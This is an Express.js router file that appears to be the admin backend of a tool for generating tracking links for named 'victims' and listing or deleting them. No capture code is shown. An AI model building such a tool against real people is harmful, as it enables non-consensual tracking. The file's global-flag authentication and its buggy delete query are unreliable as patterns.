const express=require("express");
const crypto=require("crypto");
const mongoose=require("mongoose");
const victimmodel=require("../models/victimmodels");
const dbConnect=require("../dbconnect");


const router= express.Router();

router.post("/link",generateLink);

router.post("/remove",removeVictim);

router.get("/get",getVictim);

router.get("/logout",logout);

async function generateLink(req,res)
{
		if(req.app.locals.isAuth)
		{
				let {victimname}=req.body;
				if(victimname)
				{
						const token=crypto.randomBytes(5).toString("hex");
						try
						{
							victim=await victimmodel.findOne({token:token});
							if(victim)
							{
										res.json({"status":"Try Again"});
							}
							else
							{
								 data=new victimmodel({token:token,victimname:victimname});
								 data.save().then((doc)=>
								 				{										
								 					res.json({"status":"Sucess","token":token})
								 				})
								 		.catch(err=>{res.sendStatus(400)});	
							}
						}
						catch(err)
						{
							//sending the err if it only for personal website
							res.json({"status":"Failed",msg:err.message});
						}
				}
				else
				{
					res.json({"status":"Failed",msg:"no user name provided"});
				}
		}
		else
		{
			res.json({status:"Failed",msg:"Unauthroize"});
		}
}

async function removeVictim(req,res)
{
	if(req.app.locals.isAuth)
	{
		let {token}=req.body;
		victimmodel.deleteOne({tokens:token},()=>{
											 	res.json({"status":"Sucess"});
										 	})
										 .catch((err)=>{res.json({"status":"Failed",msg:err.message});});
	}								
	else
	{
			res.json({status:"Failed",msg:"Unauthroize"});
	}
}

async function getVictim(req,res)
{
	if(req.app.locals.isAuth)
	{
		try
		{
			
			var victim=await victimmodel.find({});
		
			res.json({"status":"Sucess","victimdata":victim});
		}
		catch(err)
		{
			res.json({"status":"Failed","msg":err.message});
		}
	}
	else
	{
			res.json({status:"Failed",msg:"Unauthroize"});
	}
}

function logout(req,res) {
	req.app.locals.isAuth=false;
	res.redirect("/login");
}
module.exports=router;
